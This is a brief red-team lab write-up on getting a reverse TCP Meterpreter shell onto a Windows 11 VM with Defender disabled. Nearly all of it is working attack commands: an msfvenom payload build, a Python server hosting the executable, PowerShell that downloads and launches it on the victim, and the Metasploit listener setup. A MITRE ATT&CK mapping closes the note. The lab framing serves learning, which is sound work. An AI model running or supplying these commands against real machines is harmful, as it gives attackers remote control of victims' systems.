#  Red Team – Reverse TCP Shell

## Objective

Establish a reverse TCP Meterpreter shell on a Windows 11 VM using Metasploit.\
Note: For the Lab Windows Defender was disabled

---

## Toolset

- **Metasploit Framework**
- **msfvenom**
- **PowerShell**
- **Python HTTP Server**

---

## Payload Creation  
**(For Educational Purposes Only)**

Payload: reverse TCP Meterpreter\
Target: 64-bit Windows\
Format: .exe

bash (attacker):
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.81 LPORT=4444 -f exe -o revshell.exe
```

Delivery via PowerShell\
Host the payload on a web server:

bash (attacker):
```bash
python3 -m http.server 8080
````
Fetch and execute on the Windows target:

Powershell (victim):
````powershell
Invoke-WebRequest http://192.168.1.81:8080/revshell.exe -OutFile revshell.exe
Start-Process revshell.exe
````
Listener Setup

bash(attacker):
````bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.1.81
set lport 4444
exploit -j
````
Results:
A Meterpreter session was successfully established on the attacker's system after execution.

MITRE ATT&CK Mapping

| Technique	           |  ID           |
| -------------------- | ------------- |
| PowerShell Execution |  T1059.001    |
| Obfuscation          |  T1027        |
| Common Ports         |  T1043        |
       
